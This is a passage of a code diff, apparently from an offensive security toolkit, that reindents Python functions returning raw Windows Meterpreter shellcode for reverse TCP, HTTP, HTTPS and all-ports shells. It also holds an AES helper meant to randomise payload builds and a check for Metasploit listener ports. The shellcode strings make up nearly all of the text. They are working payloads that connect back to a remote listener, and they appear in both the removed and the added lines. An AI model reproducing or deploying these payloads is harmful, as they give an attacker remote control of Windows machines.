-		return r"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xff\xfe\xfd\xfc\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41\xff\xe7"
-		counter = 1
-	if payload == "windows/meterpreter/reverse_https":
-		return r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x6a\x00\x54\x68\x3a\x56\x79\xa7\xff\xd5\xeb\x5f\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\xbb\x01\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x48\x59\x31\xd2\x52\x68\x00\x32\xa0\x84\x52\x52\x52\x51\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x6a\x10\x5b\x68\x80\x33\x00\x00\x89\xe0\x6a\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff\xd5\x31\xff\x57\x57\x57\x57\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1a\x4b\x74\x10\xeb\xd5\xeb\x49\xe8\xb3\xff\xff\xff\x2f\x50\x6b\x57\x4a\x00\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xcd\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\x51\xff\xff\xff\x32\x35\x35\x2e\x32\x35\x34\x2e\x32\x35\x33\x2e\x32\x35\x32\x00"
-		counter = 1
-	if payload == "windows/meterpreter/reverse_http":
-		return r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x6a\x00\x54\x68\x3a\x56\x79\xa7\xff\xd5\xeb\x4b\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\xbb\x01\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x34\x59\x31\xd2\x52\x68\x00\x02\x20\x84\x52\x52\x52\x51\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x6a\x10\x5b\x31\xff\x57\x57\x57\x57\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1a\x4b\x74\x10\xeb\xe9\xeb\x49\xe8\xc7\xff\xff\xff\x2f\x4b\x51\x77\x49\x00\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xcd\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\x65\xff\xff\xff\x32\x35\x35\x2e\x32\x35\x34\x2e\x32\x35\x33\x2e\x32\x35\x32\x00"
-		counter = 1
-	if payload == "windows/meterpreter/reverse_tcp_allports":
-		return r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x12\x31\xc0\x66\x8b\x46\x02\x86\xe0\x66\x40\x86\xe0\x66\x89\x46\x02\xeb\xdf\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3"
-		counter = 1
-	if counter == 0:
-		return ""
+    counter = 0
+    if payload == "windows/meterpreter/reverse_tcp":
+        # shellcode for meterpreter reverse_tcp
+        return r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3"
+        counter = 1
+    if payload == "windows/x64/meterpreter/reverse_tcp":
+        return r"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xff\xfe\xfd\xfc\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81\xc4\x40\x02\x00\x00\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x83\xc4\x20\x5e\x6a\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x48\x01\xc3\x48\x29\xc6\x48\x85\xf6\x75\xe1\x41\xff\xe7"
+        counter = 1
+    if payload == "windows/meterpreter/reverse_https":
+        return r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x6a\x00\x54\x68\x3a\x56\x79\xa7\xff\xd5\xeb\x5f\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\xbb\x01\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x48\x59\x31\xd2\x52\x68\x00\x32\xa0\x84\x52\x52\x52\x51\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x6a\x10\x5b\x68\x80\x33\x00\x00\x89\xe0\x6a\x04\x50\x6a\x1f\x56\x68\x75\x46\x9e\x86\xff\xd5\x31\xff\x57\x57\x57\x57\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1a\x4b\x74\x10\xeb\xd5\xeb\x49\xe8\xb3\xff\xff\xff\x2f\x50\x6b\x57\x4a\x00\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xcd\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\x51\xff\xff\xff\x32\x35\x35\x2e\x32\x35\x34\x2e\x32\x35\x33\x2e\x32\x35\x32\x00"
+        counter = 1
+    if payload == "windows/meterpreter/reverse_http":
+        return r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x6a\x00\x54\x68\x3a\x56\x79\xa7\xff\xd5\xeb\x4b\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\xbb\x01\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x34\x59\x31\xd2\x52\x68\x00\x02\x20\x84\x52\x52\x52\x51\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x6a\x10\x5b\x31\xff\x57\x57\x57\x57\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x75\x1a\x4b\x74\x10\xeb\xe9\xeb\x49\xe8\xc7\xff\xff\xff\x2f\x4b\x51\x77\x49\x00\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xcd\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\x65\xff\xff\xff\x32\x35\x35\x2e\x32\x35\x34\x2e\x32\x35\x33\x2e\x32\x35\x32\x00"
+        counter = 1
+    if payload == "windows/meterpreter/reverse_tcp_allports":
+        return r"\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf\xe0\xff\xd5\x97\x68\xff\xfe\xfd\xfc\x68\x02\x00\x01\xbb\x89\xe6\x6a\x10\x56\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x12\x31\xc0\x66\x8b\x46\x02\x86\xe0\x66\x40\x86\xe0\x66\x89\x46\x02\xeb\xdf\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x85\xf6\x75\xec\xc3"
+        counter = 1
+    if counter == 0:
+        return ""
 
 # here we encrypt via aes, will return encrypted string based on secret key which is random
 def encryptAES(secret, data):
 
-	# the character used for padding--with a block cipher such as AES, the value
-	# you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
-	# used to ensure that your value is always a multiple of BLOCK_SIZE
-	PADDING = '{'
-	
-	BLOCK_SIZE = 32
-	
-	# one-liner to sufficiently pad the text to be encrypted
-	pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
-	
-	# random value here to randomize builds
-	a = 50 * 5
-	
-	# one-liners to encrypt/encode and decrypt/decode a string
-	# encrypt with AES, encode with base64
-	EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
-	DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
-	
-	#secret = os.urandom(BLOCK_SIZE)
-	cipher = AES.new(secret)
+    # the character used for padding--with a block cipher such as AES, the value
+    # you encrypt must be a multiple of BLOCK_SIZE in length.  This character is
+    # used to ensure that your value is always a multiple of BLOCK_SIZE
+    PADDING = '{'
 
-	aes = EncodeAES(cipher, data)
-	return str(aes) 
+    BLOCK_SIZE = 32
+
+    # one-liner to sufficiently pad the text to be encrypted
+    pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * PADDING
+
+    # random value here to randomize builds
+    a = 50 * 5
+
+    # one-liners to encrypt/encode and decrypt/decode a string
+    # encrypt with AES, encode with base64
+    EncodeAES = lambda c, s: base64.b64encode(c.encrypt(pad(s)))
+    DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e)).rstrip(PADDING)
+
+    #secret = os.urandom(BLOCK_SIZE)
+    cipher = AES.new(secret)
+
+    aes = EncodeAES(cipher, data)
+    return str(aes)
 
 # compare ports to make sure its not already in a config file for metasploit
 def check_ports(filename, port):
-	fileopen = file(filename, "r")
-	data = fileopen.read()
-	match = re.search("LPORT " + port, data)
-	if match:
-		return True
-	else:
-		return False
+    fileopen = file(filename, "r")
+    data = fileopen.read()
+    match = re.search("LPORT " + port, data)
+    if match:
+        return True
+    else:
+        return False
